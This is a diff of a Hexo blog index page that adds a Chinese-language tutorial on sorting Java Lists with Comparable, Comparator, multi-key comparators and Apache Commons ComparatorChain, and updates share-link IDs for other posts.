@@ -77,6 +77,87 @@ var _hmt = _hmt || [];
       <div class="outer">
         <section id="main">
   
+    <article id="post-java/Java列表组合排序" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/java/java/Java列表组合排序.html" class="article-date">
+  <time datetime="2016-04-09T16:00:00.000Z" itemprop="datePublished">2016-04-10</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/blog/categories/java/">java</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/java/java/Java列表组合排序.html">Java中List列表排序</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="简单类型元素排序"><a href="#简单类型元素排序" class="headerlink" title="简单类型元素排序"></a>简单类型元素排序</h3><p>Java中定义的List实现类有：Vector，ArrayList，LinkedList。这些集合类提供了对列表中元素的索引访问和对元素的添加与删除支持，然而并没有提供排序支持。但是java.util.Collections类提供了两种支持，如下：</p>
+<ul>
+<li>java.util.Collections.sort(java.util.List)</li>
+<li>java.util.Collections.sort(java.util.List, java.util.Comparator)</li>
+</ul>
+<p>第一个方法要求List中元素类实现java.lang.Comparable接口。<br>第二个方法需要在元素类外部使用java.util.Comparator接口。<br>Comparable需要在类内部实现排序方法，Comparator是在类外部实现的排序。<br>Comparator是一个专用的比较器，当这个对象不支持自比较时，就可以写一个比较器来比较两个对象之间大小。<br>我们常用的String和Integer内部就已经实现了Comparable接口。</p>
+<p>sort()方法可以支持对List元素的排序。我们可以简单的传一个List对象，也可以传一个List对象和一个Comparator。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">		list.add(<span class="string">"aaaa"</span>);</div><div class="line">		list.add(<span class="string">"BBBB"</span>);</div><div class="line">		list.add(<span class="string">"AAAA"</span>);</div><div class="line">		list.add(<span class="string">"bbbb"</span>);</div><div class="line">		Collections.sort(list);</div><div class="line">		System.out.println(list.toString());	<span class="comment">//[AAAA, BBBB, aaaa, bbbb]</span></div></pre></td></tr></table></figure>
+<p>以上List中元素的类型都是String类型的，排序的顺序是根据每个字符的ASCII/Unicode值顺序排序的。Unicode编码中，英文大写字母A-Z是排在小写字母a-z前面的。如果我们想让元素逆序排序，只需要传给sort()方法一个反序Comparator即可，反序Comparator对象可以直接由Connections.reverseOrder()方法获取。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">		List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</div><div class="line">		list.add(<span class="string">"aaaa"</span>);</div><div class="line">		list.add(<span class="string">"BBBB"</span>);</div><div class="line">		list.add(<span class="string">"AAAA"</span>);</div><div class="line">		list.add(<span class="string">"bbbb"</span>);</div><div class="line">		Comparator comp = Collections.reverseOrder();</div><div class="line">		Collections.sort(list, comp);</div><div class="line">		System.out.println(list.toString());	<span class="comment">//[bbbb, aaaa, BBBB, AAAA]</span></div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<h3 id="自定义类集合排序"><a href="#自定义类集合排序" class="headerlink" title="自定义类集合排序"></a>自定义类集合排序</h3><p>我们要对一个自定义的类进行排序，有两种方式，一种是让该类实现Comparable接口，并实现compareTo()方法。另一种是在类外部单独定义一个比较器，比较器实现Comparator接口。<br>现在我们定义一个Person类，有三个属性：name，birth，score，分别对应姓名，生日，和分数。我们实现一个按分数的排序。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Person</span>&gt; </span>&#123;</div><div class="line">	<span class="keyword">private</span> String name;</div><div class="line">	<span class="keyword">private</span> String birth;</div><div class="line">	<span class="keyword">private</span> <span class="keyword">int</span> score;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, String birth, <span class="keyword">int</span> score)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.name = name;</div><div class="line">        <span class="keyword">this</span>.birth = birth;</div><div class="line">        <span class="keyword">this</span>.score = score;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> name;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">		<span class="keyword">this</span>.name = name;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getBirth</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> birth;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBirth</span><span class="params">(String birth)</span> </span>&#123;</div><div class="line">		<span class="keyword">this</span>.birth = birth;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> score;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span> </span>&#123;</div><div class="line">		<span class="keyword">this</span>.score = score;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="meta">@Override</span></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Person other)</span> </span>&#123;</div><div class="line">		<span class="keyword">int</span> diff = <span class="keyword">this</span>.getScore() - other.getScore();</div><div class="line">		<span class="keyword">if</span> (diff &gt; <span class="number">0</span>) &#123;</div><div class="line">			<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (diff &lt; <span class="number">0</span>) &#123;</div><div class="line">			<span class="keyword">return</span> -<span class="number">1</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</div><div class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</div><div class="line">                <span class="string">", birth='"</span> + birth + <span class="string">'\''</span> +</div><div class="line">                <span class="string">", score="</span> + score +</div><div class="line">                <span class="string">'&#125;'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortTest</span> </span>&#123;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">		List&lt;Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"aaaa"</span>, <span class="string">"1990-01-01"</span>, <span class="number">90</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"BBBB"</span>, <span class="string">"1991-03-14"</span>, <span class="number">85</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"AAAA"</span>, <span class="string">"1992-10-21"</span>, <span class="number">98</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"bbbb"</span>, <span class="string">"1990-08-09"</span>, <span class="number">80</span>));</div><div class="line">		Collections.sort(list);</div><div class="line"></div><div class="line">		<span class="comment">//[Person&#123;name='bbbb', birth='1990-08-09', score=80&#125;, Person&#123;name='BBBB', birth='1991-03-14', score=85&#125;, Person&#123;name='aaaa', birth='1990-01-01', score=90&#125;, Person&#123;name='AAAA', birth='1992-10-21', score=98&#125;]</span></div><div class="line"></div><div class="line">		System.out.println(list.toString());</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>如果我们不想使用Person内部定义的排序，我们可以在外部使用Comparator类来实现。下面使用Comparator类实现一个要按出生日期排序。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">		List&lt;Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"aaaa"</span>, <span class="string">"1990-01-01"</span>, <span class="number">90</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"BBBB"</span>, <span class="string">"1991-03-14"</span>, <span class="number">85</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"AAAA"</span>, <span class="string">"1992-10-21"</span>, <span class="number">98</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"bbbb"</span>, <span class="string">"1990-08-09"</span>, <span class="number">80</span>));</div><div class="line">		Collections.sort(list, <span class="keyword">new</span> Comparator&lt;Person&gt;() &#123;</div><div class="line">			<span class="meta">@Override</span></div><div class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Person o1, Person o2)</span> </span>&#123;</div><div class="line">				<span class="keyword">int</span> diff = o1.getBirth().compareTo(o2.getBirth());</div><div class="line">				<span class="keyword">if</span> (diff &gt; <span class="number">0</span>) &#123;</div><div class="line">					<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (diff &lt; <span class="number">0</span>) &#123;</div><div class="line">					<span class="keyword">return</span> -<span class="number">1</span>;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">			&#125;</div><div class="line">		&#125;);</div><div class="line"></div><div class="line">		<span class="comment">//[Person&#123;name='aaaa', birth='1990-01-01', score=90&#125;, Person&#123;name='bbbb', birth='1990-08-09', score=80&#125;, Person&#123;name='BBBB', birth='1991-03-14', score=85&#125;, Person&#123;name='AAAA', birth='1992-10-21', score=98&#125;]</span></div><div class="line"></div><div class="line">		System.out.println(list.toString());</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<h3 id="多条件排序"><a href="#多条件排序" class="headerlink" title="多条件排序"></a>多条件排序</h3><p>再来实现先按分数高到低，再按出生早晚两个条件来排序。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortTest</span> </span>&#123;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">		List&lt;Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"aaaa"</span>, <span class="string">"1990-01-01"</span>, <span class="number">90</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"BBBB"</span>, <span class="string">"1991-03-14"</span>, <span class="number">85</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"AAAA"</span>, <span class="string">"1992-01-21"</span>, <span class="number">98</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"AAAA"</span>, <span class="string">"1991-10-21"</span>, <span class="number">98</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"AAAA"</span>, <span class="string">"1992-10-23"</span>, <span class="number">98</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"bbbb"</span>, <span class="string">"1990-08-09"</span>, <span class="number">80</span>));</div><div class="line"></div><div class="line">		List&lt;Comparator&lt;Person&gt;&gt; comparatorList = <span class="keyword">new</span> ArrayList&lt;Comparator&lt;Person&gt;&gt;();</div><div class="line">		comparatorList.add(compareScore);</div><div class="line">		comparatorList.add(compareBirth);</div><div class="line"></div><div class="line">		sort(list, comparatorList);</div><div class="line"></div><div class="line">		<span class="comment">//[Person&#123;name='AAAA', birth='1991-10-21', score=98&#125;, Person&#123;name='AAAA', birth='1992-01-21', score=98&#125;, Person&#123;name='AAAA', birth='1992-10-23', score=98&#125;, Person&#123;name='aaaa', birth='1990-01-01', score=90&#125;, Person&#123;name='BBBB', birth='1991-03-14', score=85&#125;, Person&#123;name='bbbb', birth='1990-08-09', score=80&#125;]</span></div><div class="line"></div><div class="line">		System.out.println(list.toString());</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(List&lt;Person&gt; list, <span class="keyword">final</span> List&lt;Comparator&lt;Person&gt;&gt; compareList)</span> </span>&#123;</div><div class="line">		<span class="keyword">if</span> (list == <span class="keyword">null</span> || compareList == <span class="keyword">null</span>) &#123;</div><div class="line">			<span class="keyword">return</span>;</div><div class="line">		&#125;</div><div class="line">		Comparator&lt;Person&gt; comparator = <span class="keyword">new</span> Comparator&lt;Person&gt;() &#123;</div><div class="line">			<span class="meta">@Override</span></div><div class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Person o1, Person o2)</span> </span>&#123;</div><div class="line">				<span class="keyword">for</span> (Comparator&lt;Person&gt; tmpComparatoe : compareList) &#123;</div><div class="line">					<span class="keyword">if</span> (tmpComparatoe.compare(o1, o2) &gt; <span class="number">0</span>) &#123;</div><div class="line">						<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">					&#125; <span class="keyword">else</span> <span class="keyword">if</span> (tmpComparatoe.compare(o1, o2) &lt; <span class="number">0</span>) &#123;</div><div class="line">						<span class="keyword">return</span> -<span class="number">1</span>;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">			&#125;</div><div class="line">		&#125;;</div><div class="line">		Collections.sort(list, comparator);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Comparator&lt;Person&gt; compareScore = <span class="keyword">new</span> Comparator&lt;Person&gt;() &#123;</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Person o1, Person o2)</span> </span>&#123;</div><div class="line">			<span class="keyword">int</span> diff = o1.getScore() - o2.getScore();</div><div class="line">			<span class="keyword">if</span> (diff &gt; <span class="number">0</span>) &#123;</div><div class="line">				<span class="keyword">return</span> -<span class="number">1</span>;</div><div class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (diff &lt; <span class="number">0</span>) &#123;</div><div class="line">				<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line"></div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Comparator&lt;Person&gt; compareBirth = <span class="keyword">new</span> Comparator&lt;Person&gt;() &#123;</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Person o1, Person o2)</span> </span>&#123;</div><div class="line">			<span class="keyword">int</span> diff = o1.getBirth().compareTo(o2.getBirth());</div><div class="line">			<span class="keyword">if</span> (diff &gt; <span class="number">0</span>) &#123;</div><div class="line">				<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (diff &lt; <span class="number">0</span>) &#123;</div><div class="line">				<span class="keyword">return</span> -<span class="number">1</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="使用apache集合操作类ComparatorUtils实现多条件排序"><a href="#使用apache集合操作类ComparatorUtils实现多条件排序" class="headerlink" title="使用apache集合操作类ComparatorUtils实现多条件排序"></a>使用apache集合操作类ComparatorUtils实现多条件排序</h3><p>上述Java原生类实现的多条件排序可读性可维护性都比较差，特别是排序条件多了以后，我们要写更多的if判断和比较器。<br>这里使用apache提供的集合操作类ComparatorUtils可以很快实现上面的排序功能。ComparatorChain排序链类使我们更方便的定义第一排序、第二排序，第三排序等等。<br>首先需要引入Apache-common的beanutils、collections、logging三个包。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> sort;</div><div class="line"></div><div class="line"><span class="keyword">import</span> java.util.ArrayList;</div><div class="line"><span class="keyword">import</span> java.util.Collections;</div><div class="line"><span class="keyword">import</span> java.util.Comparator;</div><div class="line"><span class="keyword">import</span> java.util.List;</div><div class="line"></div><div class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</div><div class="line"><span class="keyword">import</span> org.apache.commons.collections.ComparatorUtils;</div><div class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.ComparableComparator;</div><div class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.ComparatorChain;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortTest</span> </span>&#123;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">		List&lt;Person&gt; list = <span class="keyword">new</span> ArrayList&lt;Person&gt;();</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"aaaa"</span>, <span class="string">"1990-01-01"</span>, <span class="number">90</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"BBBB"</span>, <span class="string">"1991-03-14"</span>, <span class="number">85</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"AAAA"</span>, <span class="string">"1992-01-21"</span>, <span class="number">98</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"AAAA"</span>, <span class="string">"1991-10-21"</span>, <span class="number">98</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"AAAA"</span>, <span class="string">"1992-10-23"</span>, <span class="number">98</span>));</div><div class="line">		list.add(<span class="keyword">new</span> Person(<span class="string">"bbbb"</span>, <span class="string">"1990-08-09"</span>, <span class="number">80</span>));</div><div class="line"></div><div class="line">		Comparator mycmp = ComparableComparator.getInstance();</div><div class="line">		mycmp = ComparatorUtils.nullLowComparator(mycmp);<span class="comment">// 允许null</span></div><div class="line">		mycmp = ComparatorUtils.reversedComparator(mycmp);<span class="comment">// 逆序</span></div><div class="line"></div><div class="line">		ArrayList&lt;Object&gt; sortFields = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</div><div class="line">		sortFields.add(<span class="keyword">new</span> BeanComparator(<span class="string">"score"</span>, mycmp));<span class="comment">// 第一排序，分数逆序</span></div><div class="line">		sortFields.add(<span class="keyword">new</span> BeanComparator(<span class="string">"birth"</span>));<span class="comment">// 第二排序，出生时间顺序</span></div><div class="line"></div><div class="line">		ComparatorChain multiSort = <span class="keyword">new</span> ComparatorChain(sortFields);</div><div class="line">		Collections.sort(list, multiSort);</div><div class="line">		</div><div class="line">		<span class="comment">//[Person&#123;name='AAAA', birth='1991-10-21', score=98&#125;, Person&#123;name='AAAA', birth='1992-01-21', score=98&#125;, Person&#123;name='AAAA', birth='1992-10-23', score=98&#125;, Person&#123;name='aaaa', birth='1990-01-01', score=90&#125;, Person&#123;name='BBBB', birth='1991-03-14', score=85&#125;, Person&#123;name='bbbb', birth='1990-08-09', score=80&#125;]</span></div><div class="line"></div><div class="line">		System.out.println(list.toString());</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/java/java/Java列表组合排序.html" data-id="cjhajs0qz000a5cj7xs4p6q7o" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!--
+
+-->
+
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="post-java/Java列表组合排序" data-title="Java中List列表排序" data-url="undefined"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"yangdage"};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+   || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+<!-- 多说公共JS代码 end -->
+
+<!-- 搜索引擎优化 start-->
+
+<!-- 搜索引擎优化 end-->
+  
     <article id="post-javascript/函数声明-表达式-匿名函数" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/blog/javascript/javascript/函数声明-表达式-匿名函数.html" class="article-date">
@@ -135,7 +216,7 @@ var _hmt = _hmt || [];
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/javascript/javascript/函数声明-表达式-匿名函数.html" data-id="cjh8qs0u10014ooj79rufdcbo" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/javascript/javascript/函数声明-表达式-匿名函数.html" data-id="cjhajs0r7000l5cj78citucn9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -210,7 +291,7 @@ var duoshuoQuery = {short_name:"yangdage"};
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/mark/mark/vim-xml-format.html" data-id="cjh8qs0ts000qooj7mj0pc8en" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/mark/mark/vim-xml-format.html" data-id="cjhajs0rp001c5cj7tdxlab4a" class="article-share-link">Share</a>
       
       
     </footer>
@@ -285,7 +366,7 @@ var duoshuoQuery = {short_name:"yangdage"};
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/mark/mark/sublime-package-control.html" data-id="cjh8qs0tq000nooj7btwrj447" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/mark/mark/sublime-package-control.html" data-id="cjhajs0rl00165cj7neo5m2ii" class="article-share-link">Share</a>
       
       
     </footer>
@@ -410,7 +491,7 @@ var duoshuoQuery = {short_name:"yangdage"};
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/javascript/javascript/javascript-closure.html" data-id="cjh8qs0u5001booj76y1xsqri" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/javascript/javascript/javascript-closure.html" data-id="cjhajs0r2000d5cj7im3m4fge" class="article-share-link">Share</a>
       
       
     </footer>
@@ -523,7 +604,7 @@ var duoshuoQuery = {short_name:"yangdage"};
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/mark/mark/hexo-github.html" data-id="cjh8qs0t2000dooj7hev32701" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/mark/mark/hexo-github.html" data-id="cjhajs0rd000v5cj7gezjpfmf" class="article-share-link">Share</a>
       
       
     </footer>
@@ -643,7 +724,7 @@ var duoshuoQuery = {short_name:"yangdage"};
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/mark/mark/api-design.html" data-id="cjh8qs0su0007ooj7fbif8pwn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/mark/mark/api-design.html" data-id="cjhajs0r6000i5cj73lrb37hx" class="article-share-link">Share</a>
       
       
     </footer>
@@ -762,7 +843,7 @@ var duoshuoQuery = {short_name:"yangdage"};
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/mark/mark/nsq-start.html" data-id="cjh8qs0tt000sooj71t4tlhpc" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/mark/mark/nsq-start.html" data-id="cjhajs0rg00105cj7xjg08feo" class="article-share-link">Share</a>
       
       
     </footer>
@@ -832,7 +913,7 @@ var duoshuoQuery = {short_name:"yangdage"};
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/mark/mark/windows-port-used.html" data-id="cjh8qs0tz0011ooj7o41c88te" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/mark/mark/windows-port-used.html" data-id="cjhajs0ro001a5cj79lrht36v" class="article-share-link">Share</a>
       
       
     </footer>
@@ -898,7 +979,7 @@ var duoshuoQuery = {short_name:"yangdage"};
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/mark/mark/sublime关闭分组.html" data-id="cjh8qs0tp000looj7won112b5" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/mark/mark/sublime关闭分组.html" data-id="cjhajs0rk00145cj7hqnf8myn" class="article-share-link">Share</a>
       
       
     </footer>
@@ -912,188 +993,6 @@ var duoshuoQuery = {short_name:"yangdage"};
 
 <!-- 多说评论框 start -->
